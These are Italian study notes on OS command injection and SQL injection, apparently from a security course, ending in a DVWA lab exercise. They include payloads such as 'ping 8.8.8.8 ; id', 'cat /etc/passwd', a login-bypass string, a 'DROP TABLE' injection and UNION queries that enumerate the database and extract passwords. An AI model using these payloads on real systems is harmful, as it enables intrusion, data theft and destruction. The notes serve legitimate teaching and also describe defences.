 #### INJECTION (Web Exploits)
Una **injection** succede quando:
> non c’è distinzione chiara tra _input utente (dati)_ e _codice eseguito_

Quindi l’attaccante riesce a:
- inserire input
- che viene eseguito come **codice**
TIPI PRINCIPALI VISTI
- OS COMMAND INJECTION
- SQL INJECTION
##### OS COMMAND INJECTION
Una **OS Command Injection** è una vulnerabilità che si verifica quando un’applicazione:
- prende un input fornito dall’utente
- lo inserisce **direttamente** in un comando del sistema operativo
- senza validarlo o sanitizzarlo correttamente
In queste condizioni, l’attaccante può **iniettare comandi arbitrari**, che verranno eseguiti dal sistema.
Questo succede perché:
> non c’è separazione tra **dati (input utente)** e **codice (comando OS)**

Molte applicazioni server-side, per svolgere alcune operazioni, eseguono comandi di sistema.
Esempi tipici:
- ping di un host
- lettura file
- gestione processi
Per farlo, usano funzioni come:
- **C/C++** → `system()`, `execvp()`
- **Java** → `Runtime.exec()`
- **Python** → `exec()`, `eval()`
- **PHP** → `shell_exec()`, `system()`
👉 Queste funzioni passano il comando direttamente alla shell (bash, sh, cmd…).
💥 Se dentro quel comando finisce input utente non controllato → vulnerabilità.

#### ESEMPIO 
![[Pasted image 20260430113406.png]]
comando eseguito:
```
ping 8.8.8.8 ; id
```
vengono eseguiti **due comandi**:
1. ping
2. `id` (mostra utente del sistema)
Questo è esattamente quello mostrato nelle slide: **entrambi i comandi vengono eseguiti**
##### OPERATORI DI CONCATENAZIONE
- `;` → esegue entrambi 
- `|` → pipe 
- `&&` → se il primo va a buon fine 
- `||` → se il primo fallisce 
- `&` → il comando viene eseguito **in background**, cioè senza bloccare il terminale
Una volta che riesci a eseguire comandi, puoi:
###### 🔍 1. Information disclosure
- leggere file sensibili:
    ```
    cat /etc/passwd
    ```
###### 🖥️ 2. Remote access (reverse shell)
L’obiettivo reale spesso è ottenere una shell remota:
- il server si connette all’attaccante
- l’attaccante controlla il sistema
📌 Questo è mostrato nelle slide come passo successivo

###### ⚠️ 3. Limitazioni (concetto importante)
Le web app:
- non sono interattive
- girano con utenti limitati (es. `www-data`)
quindi:
- non puoi fare `sudo` facilmente
- non hai privilegi elevati
➡️ ma puoi fare **privilege escalation dopo**
##### 🛡️ Difese 
###### 1️⃣ Input Validation
 Devi controllare cosa inserisce l’utente
Ci sono due approcci:
- Approccio corretto: **Whitelist**
	- accetti solo ciò che è valido
	- Esempio:
		- IP valido → numeri + punti
- Approccio sconsigliato: **Blacklist**
	- blocchi caratteri pericolosi
	- ma rischi di dimenticare qualcosa
###### 2️⃣ Parsing corretto dell’input
Non basta filtrare:  
devi anche **interpretare correttamente l’input**
(es: separare i 4 ottetti di un IP)
###### 3️⃣ Principle of Least Privilege
L’applicazione deve girare con:
- utente dedicato
- pochi permessi (es. `www-data`)
📌 Se attaccano:
- i danni sono limitati

##### SQL INJECTION
Una **SQL Injection** è una vulnerabilità che si verifica quando:
- l’applicazione prende input utente
- lo inserisce direttamente in una query SQL
- senza validarlo o separarlo dal codice
Questo permette all’attaccante di:
> **modificare la query SQL originale** ed eseguire operazioni non previste

![[Pasted image 20260430115218.png]]

###### Attacco esempio
Immagina un login:
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```
`$user` e `$pass` vengono riempiti con input utente
###### Input malevolo (classico)
```sql
user = mariopass = ' OR '1'='1
```
la query ora sarà:
```sql
SELECT * FROM users WHERE username = 'mario' AND password = '' OR '1'='1'
```
è sempre **vera**
Quindi la condizione diventa:
```sql
(... AND password = '') OR TRUE
```
 risultato:  
la query è sempre vera  
ritorna **tutti i record**
##### Concetti SQL fondamentali (che devi sapere)
🔹 SELECT
Serve per selezionare dati:
```
SELECT col1, col2 FROM table;
```
🔹 WHERE
Filtra i risultati:
```
WHERE condizione
```
🔹 AND / OR
- `AND` → tutte le condizioni devono essere vere
- `OR` → basta una condizione vera
🔹 LIMIT
Limita il numero di risultati:
```
LIMIT 1
```
spesso usato nei login per prendere un solo utente
🔹 UNION ⚠️ (IMPORTANTISSIMA)
Permette di unire i risultati di due query:
```
SELECT col1, col2 FROM table1UNIONSELECT col3, col4 FROM table2;
```
⚠️ Regole fondamentali della UNION
Devi rispettare:
1. stesso numero di colonne
2. stesso tipo di dati
Perché UNION è così importante nell’attacco
Permette all’attaccante di:
- leggere dati da **altre tabelle**
- estrarre informazioni dal database
#### Cosa può fare davvero un attaccante
Una volta che hai una SQL Injection, non è solo “bypassare il login”.
In realtà hai **controllo parziale sulle query del database**, quindi puoi fare molto di più.
###### 🔓 1. Bypass dell’autenticazione
Lo abbiamo già visto:
- modifichi il `WHERE`
- lo rendi sempre vero
entri senza conoscere password
###### 📂 2. Lettura dei dati (Data Exfiltration)
Puoi leggere:
- utenti
- password
- email
- dati sensibili
Esempio concettuale:
```
UNION SELECT username, password FROM users
```
 il database ti restituisce dati che **non dovresti vedere**
###### 🧨 3. Modifica o distruzione dei dati
Se il database lo permette (cioè hai i privilegi), puoi fare operazioni distruttive:
```
1'; DROP TABLE Users; --
```

```
1';
```
 chiudi la stringa
```
DROP TABLE Users;
```
 comando SQL distruttivo (cancella la tabella)
```
--
```
commento → ignora il resto della query

`REPOSITORY SU GIT CON VARI ATTACCHI → payloadallthethings`
#### Tipi di SQL Injection
###### 1️⃣ In-band SQL Injection
Il più semplice
- usi **lo stesso canale**
- mandi input → ricevi output nella risposta HTTP
Esempio:
- fai injection in una pagina web
- il risultato compare nella pagina
 spesso chiamato anche:
- error-based
- union-based
![[Pasted image 20260430120155.png]]
###### 2️⃣ Out-of-band SQL Injection
Usi un **canale diverso**
- input → web app
- output → altro mezzo (email, DNS, ecc.)
Esempio:
- il database manda dati via email all’attaccante
più raro, ma utile se:
- la risposta web non mostra dati
![[Pasted image 20260430120211.png]]
###### 3️⃣ Blind SQL Injection (Inferential)
Il più “subdolo”
- NON vedi direttamente i dati
- li ricostruisci osservando il comportamento

 Due tecniche principali
 
⏱️ Timing-based
Fai query tipo:
```
IF(condizione) WAIT 5 secondi
```
 se il server risponde lentamente → condizione vera
 
🔁 Boolean-based
Osservi:
- pagina diversa
- risposta diversa
capisci se una condizione è vera o falsa
Idea chiave:
> non vedi i dati, ma li **deduci**

![[Pasted image 20260430120222.png]]

#### Detection (come scoprire la vulnerabilità)
Metodo base:
```
'
```
Perché funziona?

Se l’app fa:
```
WHERE id = '$input'
```

E tu inserisci:
```
'
```
la query diventa sintatticamente sbagliata

 il database genera un errore tipo:
> "SQL syntax error"

Questo ti dice:
- sta usando SQL
- è vulnerabile
##### Information Schema (enumerazione database)
Questo è un concetto molto importante

`information_schema` è un database speciale che contiene:
- nomi delle tabelle
- nomi delle colonne
- struttura del database
#### Come lo usa un attaccante
Esempio:
```
UNION SELECT table_name FROM information_schema.tables
```
risultato:
- lista di tutte le tabelle
Poi:
```
UNION SELECT column_name FROM information_schema.columns
```
scopri:
- colonne di una tabella
 Perché è importante
ti permette di:
1. capire struttura DB
2. sapere cosa attaccare
3. estrarre dati mirati

##### ESERCITAZIONE SQL
# 🛡️ SQL Injection – Enumerazione Database con UNION

## 🔍 Query di partenza

```sql
SELECT Name, Surname 
FROM tabella 
WHERE ID='<input>';
```

L'applicazione inserisce direttamente l'input utente nella query SQL senza sanitizzazione → vulnerabile a **SQL Injection**.

---

## 🔢 0. Scoprire il numero di colonne

Prima di utilizzare `UNION`, è fondamentale capire quante colonne restituisce la query originale.

### 🔍 Metodo 1: `ORDER BY`

Si prova a incrementare progressivamente l’indice fino a ottenere un errore:

```sql
' ORDER BY 1 -- #
' ORDER BY 2 -- #
' ORDER BY 3 -- #
```
👉 Quando si verifica un errore, significa che si è superato il numero di colonne.

✔️ Esempio:

- ORDER BY 2 → funziona
- ORDER BY 3 → errore

➡️ La query ha 2 colonne

### 🔗 Metodo 2: UNION SELECT

Si costruiscono query UNION con un numero crescente di colonne:

```sql
' UNION SELECT 1 -- #
' UNION SELECT 1,2 -- #
' UNION SELECT 1,2,3 -- # 
' UNION SELECT 1,2,3,4 -- #
``` 

👉 Quando la query funziona senza errori, si è trovato il numero corretto di colonne.

---


## 📚 1. Enumerazione dei Database

```sql
' UNION SELECT SCHEMA_NAME, 2 
FROM Information_schema.SCHEMATA -- #
```

👉 Recupera i nomi di tutti i database presenti nel DBMS.

---

## 📂 2. Enumerazione delle Tabelle

```sql
' UNION SELECT TABLE_NAME, 2 
FROM Information_schema.TABLES 
WHERE TABLE_SCHEMA = 'dvwa' -- #
```

👉 Mostra tutte le tabelle del database `dvwa`.

---

## 📑 3. Enumerazione delle Colonne

```sql
' UNION SELECT COLUMN_NAME, 2 
FROM Information_schema.COLUMNS 
WHERE TABLE_SCHEMA = 'dvwa' 
AND TABLE_NAME = 'users' -- #
```

👉 Elenca le colonne della tabella `users`.

---

## 🔓 4. Estrazione dei Dati

```sql
' UNION SELECT USER_ID, 2 FROM users -- #
```

👉 Primo test per verificare l'accesso ai dati.

---

## 🧩 5. Bypass del limite sulle colonne con `CONCAT`

Quando il numero di colonne della query originale è limitato (in questo caso 2), si può usare `CONCAT` per unire più valori in una sola colonna:

```sql
' UNION SELECT CONCAT(
    USER_ID, "-", 
    FIRST_NAME, "-", 
    LAST_NAME, "-", 
    USER, "-", 
    PASSWORD, "-", 
    LAST_LOGIN
), 2 
FROM users -- #
```

👉 Permette di estrarre più informazioni in una singola colonna.

---
